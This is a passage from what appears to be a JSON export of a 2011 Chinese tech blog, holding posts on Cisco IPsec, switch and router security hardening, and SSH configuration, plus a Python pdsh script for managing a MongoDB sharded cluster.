Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip route 0.0.0.0 0.0.0.0 192.168.15.1</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>access-list 100 permit ip 5.5.5.5 0.0.0.0 1.1.1.1 0.0.0.0</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp policy 20</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>authentication pre-share</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>encryption aes 128</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>group 2</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>hash sha</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-isakmp)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto ipsec transform-set cisco esp-aes 128 esp-sha-hmac</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(cfg-crypto-trans)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp key cisco address 192.168.15.1 no-xauth</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map mymap 10 ipsec-isakmp</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>match address 100</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set transform-set cisco</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set peer 192.168.15.1</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set pfs</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-crypto-map)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e0/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map mymap</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>end</strong></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">R5#show crypto isakmp sa</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">dst src state conn-id slot status</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">192.168.15.5 192.168.15.1 QM_IDLE 1 0 ACTIVE</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">R5#show crypto session </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Crypto session current status</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Interface: Ethernet0/3</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Session status: UP-ACTIVE </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Peer: 192.168.15.1 port 500 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IKE SA: local 192.168.15.5/500 remote 192.168.15.1/500 Active </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IPSEC FLOW: permit ip host 5.5.5.5 host 1.1.1.1 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Active SAs: 2, origin: crypto map</span></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "30"
    }
  },
  {
    "id": 84,
    "title": "思科网络安全专题（一）:关于交换机安全",
    "category": "安全",
    "tags": [
      "交换机安全"
    ],
    "url": "/archives/guanyujiaohuanjianquan/",
    "content": "<p>生产环境交换机比较多，以前的同事没有对其进行什么安全策略，就是简单配置一个登录密码而已。我接手后进行了一些改造！</p>\n\n<p>1 禁用DTP，中继</p>\n\n<p>因为一些交换机默认的中继为auto模式。可能在收到dtp协议帧后自动成为中继。</p>\n\n<p>SW1(config-if)# int range fastEthernet 0/1  - 48</p>\n\n<p>SW1(config-if-range)#switchport mode access</p>\n\n<p>2 stp安全</p>\n\n<p>如果攻击者获得2个不同交换的2个端口，可将一个交换机引入网络，配置更高的桥优先级，使之比根桥的桥接优先级更低，这样stp重新收敛后就会被这个冒充交换机截取流量</p>\n\n<p>1 根保护： 收到bpdu后进入根保护不一致的状态，端口不再转发流量，bpdu停止后恢复</p>\n\n<p>SW1(config-if)# int range fastEthernet 0/1  - 48</p>\n\n<p>SW1(config-if-range)#spanning-tree  guard root<!--more--></p>\n\n<p>2  BPDU保护：如果收到bpdu后次端口会被禁用</p>\n\n<p>SW1(config-if)# int range fastEthernet 0/1  - 48</p>\n\n<p>SW1(config-if-range)#spanning-tree portfast bpduguard</p>\n\n<p>3 arp安全</p>\n\n<p>交换机可信端口容许arp回复，不可信端口的arp的回复内容会和绑定表对比验证正确性</p>\n\n<p>R1(config)#ip arp inspection vlan 13  //在lan启动此特性，arp回复内容不一致端口会被禁用</p>\n\n<p>或者：</p>\n\n<p>SW1(config)# int range fastEthernet 0/1  - 15</p>\n\n<p>SW1(config-if-range)#ip arp inspection  trust  //端口启用此特性</p>\n\n<p>4 vlan访问控制列表</p>\n\n<p>SW1(config)#access-list 17 permit tcp any host 192.168.8.127 eq telnet</p>\n\n<p>SW1(config)#vlan access-map ALLOWTELNET 10 //定义一个vlan access map，取名为ALLOWTELNET\nSW1(config-access-map)# match ip address 100 // 设置匹配规则为acl 1010\nSW1(config-access-map)# action forward // 匹配后，设置数据流转发（forward）</p>\n\n<p>SW1(config-access-map)#exit</p>\n\n<p>SW1(config)#vlan filter ALLOWTELNET vlan-list 1-45</p>\n\n<p>5 端口安全</p>\n\n<p>SW1(config)#int f0/12</p>\n\n<p>SW1(config-if)#switchport mode access</p>\n\n<p>SW1(config-if)#switchport port-security   //启用端口安全\nSW1(config-if)#switchport port-security violation protect  //针对非法接入计算机，端口处理模式丢弃数据包\nSW1(config-if)#switchport port-security mac-address sticky  //使已经学到的MAC地址动态的进入交换机配置</p>\n\n<p>SW1(config-if)#switchport port-security mac-address  XXXX.XXXX.XXXX  //为端口输入特定的允许通过的mac地址</p>\n\n<p>SW1(config-if)#switchport port-security maximum 5   //可以最大学习5个MAC地址\n6 其他</p>\n\n<p>no service finger\nno service pad\nno service udp-small-servers\nno service tcp-small-servers\nservice password-encryption\nservice tcp-keepalives-in\nservice tcp-keepalives-out\nno cdp run\nno ip bootp server\nno ip http server\nno ip finger\nno ip source-route\nno ip gratuitous-arps\nno ip identd\nbanner motd ^C\nPlease leave immediately, otherwise it will be held liable\n^C\nsecurity passwords min-length 6</p>\n\n<p>login block-for 15  attempts 3 within 60</p>\n\n<p>aaa new-model\naaa authentication login local_auth local\nline con 0\nlogin authentication local_auth\nexec-timeout 5 0\ntransport output telnet\nline aux 0\nlogin authentication local_auth\nexec-timeout 10 0\ntransport output telnet\nline vty 0 15\nlogin authentication local_auth\ntransport input ssh telnet</p>\n\n<p>ip tcp intercept list autosec_tcp_intercept_list\nip tcp intercept drop-mode random\nip tcp intercept watch-timeout 15\nip tcp intercept connection-timeout 3600\nip tcp intercept max-incomplete low 450\nip tcp intercept max-incomplete high 550</p>\n\n<p>interface Vlan1\nno ip redirects\nno ip proxy-arp\nno ip unreachables\nno ip directed-broadcast\nno ip mask-reply\nno mop enabled</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "31"
    }
  },
  {
    "id": 85,
    "title": "路由器上面启用安全Shell（ssh）",
    "category": "安全",
    "tags": [
      "思科ssh"
    ],
    "url": "/archives/luyouqishangmianqiyonganquanshellssh/",
    "content": "<p>R1(config)#ip domain-name dongwm.com</p>\n\n<p>R1(config)#crypto key zeroize rsa\n% No Signature RSA Keys found in configuration.  //想把配置中的rsa清除 但是发现配置中没有配置 呵呵</p>\n\n<p>R1(config)#crypto key generate rsa general-keys modulus 1024  //产生SSH所用安全密钥 长度为1024 类型为rsa</p>\n\n<p>% You already have RSA keys defined named R1.dongwm.com.\n% They will be replaced.</p>\n\n<p>% The key modulus size is 1024 bits\n% Generating 1024 bit RSA keys, keys will be non-exportable...\n*Mar  1 00:06:14.043: %SSH-5-DISABLED: SSH 1.99 has been disabled[OK]\n*Mar  1 00:06:20.631: %SSH-5-ENABLED: SSH 1.99 has been enabled</p>\n\n<p>R1(config)#ip ssh time-out 90  //设置ssh超市时间为90s</p>\n\n<p>R1(config)#ip ssh authentication-retries 4  //重置ssh验证的错误尝试次数</p>\n\n<p>R1(config)#line vty 0 15</p>\n\n<p>R1(config-line)#transport input ssh //容许vty线路使用ssh</p>\n\n<p>R1#sh crypto key mypubkey rsa\n% Key pair was generated at: 00:06:20 UTC Mar 1 2002\nKey name: R1.dongwm.com\nUsage: General Purpose Key\nKey is not exportable.\nKey Data:\n30819F30 0D06092A 864886F7 0D010101 05000381 8D003081 89028181 00C04D5B\nEA7876B0 DAD6D615 6F2B7DC6 8A6DB09A FA3C1EA0 36173B5C ACCC56C2 796D814B\n9F27CECF C48FD5D9 F9547F96 4623BDD2 D53CA81D D95B426F 64DB1D2B 01CD2BD0\n6C7223BB 3DDA577A 7E1D9AA8 7D48080E A9EB69E5 93A3E851 41F22715 27961027\nE254956F 7E6C23F3 4D314CF9 75E99F1B 1A0F287D 1AC4D83A 2AA7BD8F 55020301 0001\n% Key pair was generated at: 00:06:21 UTC Mar 1 2002\nKey name: R1.dongwm.com.server\nUsage: Encryption Key\nKey is not exportable.\nKey Data:\n307C300D 06092A86 4886F70D 01010105 00036B00 30680261 00D36FB0 D8F4A184\n7C8CAEAB C5F0155F B7FA5BEB 65096F81 18359560 53D5F9C9 CF2C0470 F04EE42B\n773E4E4F 7B181E2E BC83D77B 2C9A6C54 247D4ECA 77E53770 D440F979 A7A327CE\n5B35A59C 61EE0AD9 9A4D0C09 EE108B57 F906A97E FF24BE90 CF020301 0001</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "31"
    }
  },
  {
    "id": 86,
    "title": "思科网络安全专题（二）:关于路由器安全",
    "category": "安全",
    "tags": [

    ],
    "url": "/archives/sikewangluoanquanzhuantierguanyuluyouqianquan/",
    "content": "<p>怎么说我也是ccsp出生，呵呵也看过很多IE级别的关于安全的书 ，所以最近准备做一个基于配置的关于安全的专题。</p>\n\n<p>1  vty访问</p>\n\n<p>虚拟终端访问当然需要一些安全</p>\n\n<p>3640_M(config)#aaa new-model\n3640_M(config)#aaa authentication login for-ssh local</p>\n\n<p>3640_M(config)#username dongwm password dongwmtest</p>\n\n<p>3640_M(config)#line vty 0 4\n3640_M(config-line)#transport input ssh\n3640_M(config-line)#exec-timeout 3 30  //超时时间为3分30秒\n3640_M(config-line)#login authentication for-ssh</p>\n\n<p>2 记录路由器事件</p>\n\n<p>3640_M(config)#service timestamps debug datetime msec localtime show-timezone\n3640_M(config)#service timestamps log datetime msec localtime show-timezone   //用Log信息和Debug信息的时间戳，格式为Datetime：，并且支持毫秒显示\n3640_M(config)#no logging console  //<span>禁止在控制台上打印日志报文</span>\n3640_M(config)#logging buffered 16384  //将日志信息记录到内存缓冲区的大小<!--more-->\n3640_M(config)#logging trap debugging   // //配置要发送到日志服务器的日志优先级，默认发送到日志服务器的优先级为Info\n3640_M(config)#logging facility local7  //配置日志存储的facility ，默认是local7\n3640_M(config)#logging 58.83.22.22\n3640_M(config)#logging source-interface loopback0  //日志发出用的源ip地址用回环</p>\n\n<p>3  snmp控制</p>\n\n<p>3640_M(config)# snmp-server community 5sffee RO 98  // 配置本路由器的只读字串为5sffee  符合acl98\n3640_M(config)#snmp-server trap-source loopback0 //将<span style=\"font-family: Times New Roman,serif;\">loopback</span>接口的<span style=\"font-family: Times New Roman,serif;\">IP</span>地址作为<span style=\"font-family: Times New Roman,serif;\">SNMP Trap</span>的发送源地址\n3640_M(config)#snmp-server trap-authentication  //<span>如果共用字符串的验证失败，发送一个trap</span>\n3640_M(config)#snmp-server enable traps config  // 允许路由器将config类型<span style=\"font-family: Times New Roman,serif;\">SNMP Trap</span>发送出去\n3640_M(config)#snmp-server host 192.168.8.23 5sffee  // 指定路由器<span style=\"font-family: Times New Roman,serif;\">SNMP Trap</span>的接收者为 192.168.8.23，发送<span style=\"font-family: Times New Roman,serif;\">Trap</span>时采用5sffee作为字串\n3640_M(config)#access-list 98 permit host 192.168.8.11</p>\n\n<p>4  控制http</p>\n\n<p>3640_M(config)# ip http port 20000  //将默认http端口改成20000\n3640_M(config)#ip http authentication aaa\n3640_M(config)#ip http access-class 12\n3640_M(config)#access-list 12 permit host 192.168.8.13</p>\n\n<p>4  开启ip cef</p>\n\n<p>syn泛洪和ddos会使用大量随机或者假冒的IP地址作为最终目标，这回对路由器的CPU强度增加很大负担，CEF特性会让新IP需要路由时候不需要每次都更新cache</p>\n\n<p>5  调度表</p>\n\n<p>上述攻击时会因为大量分组变得忙于响应，从而不能执行给他配置的其他任何需要执行的功能</p>\n\n<p>3640_M(config)#scheduler allocate 30000 2000/修改cpu花费在进程任务的时间为30000快速交换中的时间为2000</p>\n\n<p>6 登录标识</p>\n\n<p>3640_M(config)#banner motd #\nEnter TEXT message.  End with the character '#'.\nPlease leave immediately, otherwise it will be held liable\n#</p>\n\n<p>3640_M(config)#aaa authentication banner  \"this is dongwm.com\"\n3640_M(config)#aaa authentication fail-message  \"logging failed\"</p>\n\n<p>7 在负载高时候启用nagle提高telnet访问性能</p>\n\n<p>当收到攻击telnet往往会很慢，并且telnet进一步影响路由器性能，nagle服务可以提高telnet性能</p>\n\n<p>3640_M(config)#service nagle</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "01"
    }
  },
  {
    "id": 87,
    "title": "mongodb集群管理脚本（python）",
    "category": "mongodb",
    "tags": [
      "mongodb管理脚本"
    ],
    "url": "/archives/mongodbguanlijiaoben/",
    "content": "<p>前言：mongodb集群需要一个管理脚本，比如启动集群，关闭集群，查看集群状态等功能，本脚本使用了pdsh代替ssh，本来为了并行操作，但是事实上在for循环里面并行是不必要的，所以可以改成ssh的。以后会改成多线程并行操作。</p>\n\n<p>本脚本特性：</p>\n\n<p>1 需要安装PDSH （并行的ssh）和termcolor(一个让终端显示颜色的pythonapi)，-h选项有安装方法介绍</p>\n\n<p>2 支持查看集群服务状态（包括查看监听端口列表和各设定服务是否正常，正常状态为绿色，不正常为红色），start/stop/restart等集群服务</p>\n\n<p>3 支持tab自动补齐相关命令</p>\n\n<p>4  启动服务前先判定服务是否运行，防止多次启动。停止服务时给于倒计时，防止误操作</p>\n\n<p>5  效果截图：</p>\n\n<p><img class=\"alignnone\" title=\"mongodb1\" src=\"http://farm7.static.flickr.com/6143/6034397038_9edf238f9b_z.jpg\" alt=\"\" width=\"640\" height=\"437\" /></p>\n\n<p><img class=\"alignnone\" title=\"mongodb2\" src=\"http://farm7.static.flickr.com/6189/6034397214_dc86e3bd26_z.jpg\" alt=\"\" width=\"640\" height=\"264\" /></p>\n\n<p><img class=\"alignnone\" title=\"mongodb3\" src=\"http://farm7.static.flickr.com/6181/6033847951_a7e188c613_z.jpg\" alt=\"\" width=\"640\" height=\"437\" /></p>\n\n<p>本脚本需要一个配置文件conf.cfg，当切换shard或者仲裁到其他服务器上面时候只需要修改此配置文件，本例有7台服务器，其中mongod1代表shard1，mongod3a代表shard3的arbiter，这样的写法是我为了直接在脚本里面取值，因为在相应服务器启动进程使用的是init.d下的脚本，配置文件也是conf型，下面有2个例子：</p>\n\n<p>cat /etc/conf.cfg  //python脚本的配置文件\n<pre class=\"sh_python\">\n[host]\n hosts=mg01,mg02,mg03,mg04,mg05,mg06,mg07\n [mg01]\n mongod = mongod1,mongod4\n arbiter= mongod3a\n config =\n mongos = mongos\n [mg02]\n mongod = mongod1,mongod4\n arbiter= mongod3a\n config = mongoconfig\n mongos =\n [mg03]\n mongod = mongod1,mongod2\n arbiter= mongod4a\n config =\n mongos = mongos\n [mg04]\n mongod = mongod2\n arbiter= mongod1a,mongod4a\n config = mongoconfig\n mongos =\n [mg05]\n mongod = mongod2,mongod3\n arbiter= mongod1a\n config =\n mongos = mongos\n [mg06]\n mongod = mongod3\n arbiter= mongod2a\n config = mongoconfig\n mongos =\n [mg07]\n mongod = mongod3,mongod4\n arbiter= mongod2a\n config =\n mongos = mongos\n</pre></p>\n\n<p>cat /etc/init.d/mongod1  //mongodb进程启动脚本，支持start，stop等\n<pre class=\"sh_bash\">\n#!/bin/bash</p>\n\n<p># mongod - Startup script for mongod</p>\n\n<p># chkconfig: 35 85 15\n # description: Mongo is a scalable, document-oriented database.\n # processname: mongod\n # config: /etc/mongod.conf\n # pidfile: /var/run/mongo/mongo.pid</p>\n\n<p>. /etc/rc.d/init.d/functions</p>\n\n<p># things from mongod.conf get there by mongod reading it</p>\n\n<p>OPTIONS=\" -f /etc/mongod1.conf\"</p>\n\n<p>mongod=${MONGOD-/usr/local/mongodb/bin/mongod}</p>\n\n<p>MONGO_USER=mongod\n MONGO_GROUP=mongod</p>\n\n<p>start()\n {\n echo -n $\"Starting mongod1: \"\n daemon --user \"$MONGO_USER\" $mongod $OPTIONS\n RETVAL=$?\n echo\n [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/mongod1\n }</p>\n\n<p>stop()\n {\n echo -n $\"Stopping mongod1: \"\n killproc -p /var/lib/mongo/mongod1.lock -t30 -TERM /usr/local/mongodb/bin/mongod\n RETVAL=$?\n echo\n [ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/mongod1\n }</p>\n\n<p>restart () {\n stop\n start\n }</p>\n\n<p>ulimit -n 12000\n RETVAL=0</p>\n\n<p>case \"$1\" in\n start)\n start\n ;;\n stop)\n stop\n ;;\n restart|reload|force-reload)\n restart\n ;;\n condrestart)\n [ -f /var/lock/subsys/mongod1 ] &amp;&amp; restart || :\n ;;\n status)\n status $mongod\n RETVAL=$?\n ;;\n *)\n echo \"Usage: $0 {start|stop|status|restart|reload|force-reload|condrestart}\"\n RETVAL=1\n esac</p>\n\n<p>exit $RETVAL\n</pre></p>\n\n<p>cat /etc/mongod1.conf  //mongodb启动脚本需要的conf配置文件，mongos和config配置文件类似\n<pre class=\"sh_bash\">\n# shard1 config\n shardsvr=true\n replSet=shard1\n port=10000\n fork=true\n journal=true\n dbpath=/data/shard1\n oplogSize=10240\n logpath=/data/shard1/shard1.log\n logappend=true\n pidfilepath=/var/lib/mongo/mongod1.lock\n unixSocketPrefix=/data/shard1/\n</pre></p>\n\n<p>下面是python管理脚本：</p>\n\n<p>cat /usr/bin/Mshell.py  //真正的管理脚本</p>\n\n<p><pre class=\"sh_python\">\n#!/bin/env python\n# coding=gbk</p>\n\n<p>#__doc__注释  执行脚本 -h 或者 --help  打印输出的内容\n\"\"\"\nThis script is used to manage mongodb!</p>\n\n<p>The Feature:\n1 Support command automatically filled\n2 View the current status of the cluster\n3 Shut down or start the cluster service</p>\n\n<p>Required dependencies:\n1 PDSH -&gt; Parallel Distributed Shell\nInstallation:\nrpm -ivh pdsh-2.24-1.el5.rf.x86_64.rpm\n2 termcolor -&gt; ANSII Color formatting for output in terminal\nInstallation:\npython setup.py install</p>\n\n<p>Usage:\n/usr/bin/Mshell.py\nNote: Does not require any parameters</p>\n\n<p>Writer:Dongweiming</p>\n\n<p>\"\"\"\n#引用一些需要的模块\nimport os\nimport sys\nimport time\nimport re\nimport string\nimport readline\nfrom subprocess import Popen, PIPE\nimport ConfigParser\nfrom optparse import OptionParser\nfrom termcolor import colored</p>\n\n<p>class Cfg():\n#类初始化函数\n    def __init__(self,cfg):\n        self.cfg = cfg\n        self._parse_configure()\n#设定取值逻辑，当出现多个分割格式化\n    def _get_value(self,conf, line, key):\n        try:\n            value = conf.get(line, key)\n        except ConfigParser.NoOptionError:\n            return []\n        if value:\n            return [i.strip() for i in value.split(',') if i]\n        else:\n            return []\n#从配置文件中取得某主机某服务相关值\n    def _parse_configure(self):\n        conf = ConfigParser.RawConfigParser()\n        conf.read(self.cfg)\n        green_on_grey = lambda x:colored(x,'red','on_grey')\n        self.hosts=self._get_value(conf,'host','hosts')\n        for h in self.hosts:\n            for service in ['arbiter', 'config', 'mongod', 'mongos']:\n                setattr(self, '%s_%s' % (h, service), self._get_value(conf, h, service))\n                self.h_service=self._get_value(conf, h, service)\n#登录Shell打印一些配置文件格式化后的明细\n            print green_on_grey('host:\\t%s\\n') % h\n            if getattr(self,'%s_mongod' % h):\n                print colored('Shard:\\t%s','yellow')  % getattr(self,'%s_mongod' % h )\n            if getattr(self,'%s_config' % h):\n                print colored('Config server is Open','green')\n            if getattr(self,'%s_mongos' % h):\n                print colored('Mongos server is Open','magenta')\n            if getattr(self,'%s_arbiter' % h):\n                print colored('Arbiter:\\t%s','blue') % getattr(self,'%s_arbiter' % h )</p>\n\n<p>class Manager(Cfg):\n#初始化函数\n    def __init__(self,confile):\n        Cfg.__init__(self,confile)\n        self.services = [ 'arbiter', 'config', 'mongod', 'mongos', 'all','*']\n#执行命令的函数，设定命令操作逻辑过程\n    def fetch_job(self,cmd):\n        cmd = cmd.strip().split(None, 2)\n        if len(cmd) == 1 and cmd[0] not in ['show', 'help','status']:\n            print '%s what...' % cmd[0]\n            return\n        service= None\n        host = None\n#判断当命令以 start stop开始，host和服务是不是再设定的范围值\n        if cmd[0] in ['start', 'stop']:\n            if '@' in cmd[1]:\n                (service,host) = cmd[1].split('@')\n                if host not in self.hosts:\n                    print 'No such a host %s' % host\n                    return\n            else:\n                service = cmd[1]\n                host = 'all'</p>\n\n<p>            if service not in self.services:\n                print \"bad service %s,Correct parameters: [ 'arbiter', 'config', 'mongod', 'mongos', 'all','*']\" % service\n                return\n#当符合要求 调用下面的_start_srv函数用于启动\n            if cmd[0] == 'start' and len(cmd) == 2:\n                self._start_srv(host, service)\n            elif cmd[0] == 'stop' and len(cmd) &lt;= 3:\n                now = False\n                if len(cmd) == 3:\n                    if cmd[2] == 'now':\n                        now = True\n                    else:\n                        print 'Oops, bad command'\n                        return\n                self._stop_srv(host, service, now)\n            else:\n                print 'Oops, bad command'\n                return\n        elif cmd[0] == 'show':\n            self._show_srv()\n        elif cmd[0] == 'help':\n            self._show_help()\n        elif cmd[0] == 'status':\n            self._status_srv()\n        else:\n            print 'command error %s %s' % (cmd[0], cmd[1])\n            return\n#执行show命令\n    def _show_srv(self):\n        print  colored('服务器'+('-'*2) + 'PID'+('-'*4)+ '数据'+('-'*10)+'监听端口'+('-'*4)+'服务端口','blue')\n        for host in self.hosts:\n            cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s ps -ef |grep mongod|grep -v grep' % ( host )\n            for line in os.popen(cmd).readlines():\n                dict = {}\n                s = string.split(line)\n                if s[1] == 'mongod':\n                    cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s cat %s|grep -v \"#\"|grep -v \"^$\"' % (s[0].strip(':'),s[10])\n                    for line in os.popen(cmd).readlines():\n                        f = string.rstrip(line)\n                        value = f.split('=')[1:2]\n                        key = f.split('=')[0].split(':')[1]\n                        if key != '':\n                           dict[key] = value\n                           if not dict.get(\" replSet\"):\n                               dict[' replSet']=['NO']\n                    print  colored(s[0].ljust(6,' '),\"red\"),colored(s[2].ljust(6,' '),\"green\"),colored('%s  %s ','cyan') % (''.join(dict.get(\" unixSocketPrefix\")).split('/')[2].ljust(14,' '),''.join(dict.get(\" port\")).ljust(8,' '))\n#查看集群状态，执行status命令\n    def _status_srv(self):\n        yellow_on_grey = lambda x:colored(x,'yellow','on_grey')\n        for h in self.hosts:\n            print yellow_on_grey('host:\\t%s\\n') % h\n            for str in ','.join(getattr(self,'%s_mongod' % h)).split(','):\n                if getattr(self,'%s_mongod' % h):\n                       cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s grep \"^port\" /etc/%s.conf' % (h,str)\n                       for line in os.popen(cmd).readlines():\n                           cmds =\"PDSH_SSH_ARGS_APPEND='-p9922' pdsh -Rssh -w ssh:root@%s netstat -tunlp|egrep '10000|12000|14000|16000'|awk '{print $5}'|cut -d':' -f2\"  % h\n                           for lines in  os.popen(cmds).readlines():\n                               setattr(self, '%s' % h,lines.strip())\n                               if line.strip().split('=')[1]  in lines.strip():\n                                   print 'Shard :%s\\t [%s] ' % (str,colored('ok','green'))\n                                   break\n                           #else  line.strip().split('=')[1] not in lines.strip():\n                           else:\n                                   print 'Shard :%s\\t [%s] ' % (str,colored('ok','red'))</p>\n\n<p>            if getattr(self,'%s_arbiter' % h):\n                for str in ','.join(getattr(self,'%s_arbiter' % h)).split(','):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s grep \"^port\" /etc/%s.conf' % (h,str)\n                        for line in  os.popen(cmd).readlines():\n                            f = string.rstrip(line)\n                            cc=f.split('=')[1]\n                            cmd1 = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp|grep mongo|grep \"1[0-9]\\{3\\}1\"' % h\n                            for line in  os.popen(cmd1).readlines():\n                               t = string.rstrip(line)\n                               value=t.split('0.0.0.0:')[1].rstrip()\n                               if cc in value:\n                                print 'Arbiter :%s\\t [%s] ' % (str,colored('ok','green'))\n                                break\n                            else:\n                                print 'Arbiter :%s\\t [%s] ' % (str,colored('ok','red'))</p>\n\n<p>            if getattr(self,'%s_config' % h):\n                for str in ''.join(getattr(self,'%s_config' % h)).split(','):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s grep \"^port\" /etc/mongoconfig.conf' % h\n                        for line in  os.popen(cmd).readlines():\n                            f = string.rstrip(line)\n                            cc=f.split('=')[1]\n                            cmd1 = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp|grep 20000' % h\n                            for line in  os.popen(cmd1).readlines():\n                               t = string.rstrip(line)\n                               value=t.split('0.0.0.0:')[1].rstrip()\n                               if cc in value:\n                                  print 'Config :%s\\t %s' % (str,('[' + colored('ok','green')+']'))\n                                  break\n                            else:\n                                  print 'Config :%s\\t %s' % (str,('[' + colored('ok','red')+']'))\n            if getattr(self,'%s_mongos' % h):\n                for str in ''.join(getattr(self,'%s_mongos' % h)).split(','):\n                        cmd = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w  ssh:root@%s grep \"^port\" /etc/mongos.conf' % h\n                        for line in  os.popen(cmd).readlines():\n                            f = string.rstrip(line)\n                            cc=f.split('=')[1]\n                            cmd1 = 'PDSH_SSH_ARGS_APPEND=\"-p9922\" pdsh -Rssh -w ssh:root@%s netstat -tunlp|grep mongos' % h\n                        for line in  os.popen(cmd1).readlines():\n                            t = string.rstrip(line)\n                            value=t.split('0.0.0.0:')[1].rstrip()\n                            if cc in value:\n                                print 'Mongos :%s\\t [%s] ' % (str,colored('ok','green'))\n                                break\n                        else:\n                                print 'Mongos :%s\\t [%s] ' % (str,colored('ok','red'))\n                                break\n#当执行 start 